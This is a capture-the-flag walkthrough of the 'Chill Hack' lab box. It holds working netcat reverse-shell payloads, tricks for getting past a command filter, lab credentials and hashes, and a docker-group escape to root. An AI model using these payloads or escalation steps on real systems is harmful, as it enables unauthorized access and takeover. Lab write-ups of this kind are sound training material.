# Chill Hack

## Scanning & Enumeration

Runing nmap

```bash
nmap -p- -T4 -sC 10.10.16.179
```

Output:

```bash
Nmap scan report for chill_hack (10.10.16.179)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.1.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%)
```

#### Port 21

We have anonymous ftp access so we connect to the ftp server

```bash
ftp 10.10.16.179
```

We can see that there is a file inside. In order to download it:

```bash
get note.txt
```

Inside we can see 2 potential usernames: **Anurodh**, **Apaar**  
They are talking tho about filtering strings so maybe there is an rce
hidding somewhere

#### Port 80

Doing a gobuster

```bash
gobuster dir -u http://chill_hack/ -w /usr/share/wordlists/rockyou.txt -x php,txt,html -t 60
```

I found: **/secret**

Navigating to it we quickly understand that we can run commands but some of
them are blocked!!!

## Exploitation

In order to bypass the filtering there are a lot of methods

Escape chars

```bash
l\s -la
c"a"t
```

Putting bash commands together

```bash
echo "";ls
```

And many more. With all that said there are also a lot of payloads to create
a reverse shell and get access.

First start a nc listener:

```bash
nc -nvlp 4444
```

And then some working payloads

```bash
r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.219 4444 >/tmp/f
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.219 4444 >/tmp/f
...
```

## Post Exploitation

#### Getting the Apaar user

After we get the initial foothold, we start enumerating the machine  
Quickly we find out using `sudo -l` about the `.helpline.sh` script  

So we know due to the permitions that if we can spawn a shell from the
script we can leverage to apaar

Analyzing the script... the user's supplied input is directly passed to
a bash instance and we could use this to our advantage

```bash
sudo -u apaar /home/apaar/.helpline.sh
...
Hello user! I am ian, Please enter you message: /bin/bash
```

And we get a shell as **Apaar**!!!

Apaar has a **.ssh** dir so to get a more stable shell we can import
our public key to the **authorized_keys** file

#### Getting the Anurodh user

Enumerating the machine I stubled uppon a 2nd website  
Doing a search for open ports and running services on the machine

```bash
netstat -tulp
```

I see that:

```bash
tcp        0      0 localhost:9001          0.0.0.0:*               LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
```

This means that the box runs a mysql database and yeah bingo another website is
running.

There are many way to enumerate this but I was lazy to start port forwarding
so I just went to the **/var/www/files** directory and started reading code

Right of the bat reading **index.php** gave me a lot of info and creds for
the database

```bash
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

I played with the database and found some passwords, crack them but
there weren't usefull at all.

```bash
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd:masterpassword
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649:dontaskdonttell
```

So I jumped back to the **index.php** file and saw that if the the username,
password is correct this website redirects you to **hacker.php**

Reading the code I quickly understand that there's nothing to it.  
I searched for a while to find some other info but nothing...

After taking a break I decided to look again at the **hacker.php** source code

```bash
<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
<h1 style="background-color:red;">You have reached this far. </h2>
<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
```

I was doing this box with @Cyberd0xed and see suggested that there might be
something hidding in the photo

Navigating to the **images** dir I downloaded the hacker-with-laptop_23.jpg

```bash
steghide extract -sf hacker-with-laptop_23.jpg
```

And we get a **backup.zip** file

```bash
zip2john backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

And the password is: **iamthebest**

Extracting the **backup.zip** gives as a PHP source code that contains
a new password: **!d0ntKn0wmYp@ssw0rd**

If we try to login as Anurodh with this password, it works!!!

## Privilege Escallation

Running:

```bash
id
```

We see that Anurodh belongs to the **docker** group  
Looking at [gtfobins](https://gtfobins.github.io/gtfobins/docker/), we see
that we can spawn a root shell with:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

And we get root!  
Amazing room

```json
```
